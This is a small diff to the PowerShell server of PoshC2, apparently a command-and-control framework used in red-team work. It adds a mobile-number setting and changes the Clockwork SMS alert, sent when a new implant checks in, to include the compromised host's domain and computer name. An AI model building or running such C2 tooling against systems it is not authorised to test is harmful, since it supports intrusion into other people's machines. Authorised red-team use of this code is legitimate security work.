@@ -294,6 +294,7 @@ if ($RestartC2Server)
     $httpresponse = $c2serverresults.HTTPResponse
     $enablesound = $c2serverresults.Sounds
     $apikey = $c2serverresults.APIKEY
+    $mobilenumber = $c2serverresults.MobileNumber
     $urlstring = $c2serverresults.URLS
 
     Write-Host `n"Listening on: $ipv4address Port $serverport (HTTP) | Kill date $killdatefm" `n -ForegroundColor Green
@@ -843,7 +844,7 @@ while ($listener.IsListening)
 
         # optional clockwork sms on new implant
         if (($apikey) -and ($mobilenumber)){
-            (New-Object System.Net.Webclient).DownloadString("https://api.clockworksms.com/http/send.aspx?key=$($apikey)&to=$($mobilenumber)&from=PoshC2&content=$($im_computername)")|Out-Null
+            (New-Object System.Net.Webclient).DownloadString("https://api.clockworksms.com/http/send.aspx?key=$($apikey)&to=$($mobilenumber)&from=PoshC2&content=NewImplant:$($im_domain)\$($im_computername)")|Out-Null
         }
 
         if ($enablesound -eq "Yes") {
@@ -1177,7 +1178,7 @@ $message =[Convert]::ToBase64String($Bytes)
 
         # optional clockwork sms on new implant
         if (($apikey) -and ($mobilenumber)){
-            (New-Object System.Net.Webclient).DownloadString("https://api.clockworksms.com/http/send.aspx?key=$($apikey)&to=$($mobilenumber)&from=PoshC2&content=$($im_computername)")|Out-Null
+            (New-Object System.Net.Webclient).DownloadString("https://api.clockworksms.com/http/send.aspx?key=$($apikey)&to=$($mobilenumber)&from=PoshC2&content=NewImplant:$($im_domain)\$($im_computername)")|Out-Null
         }
 
         if ($enablesound -eq "Yes") {
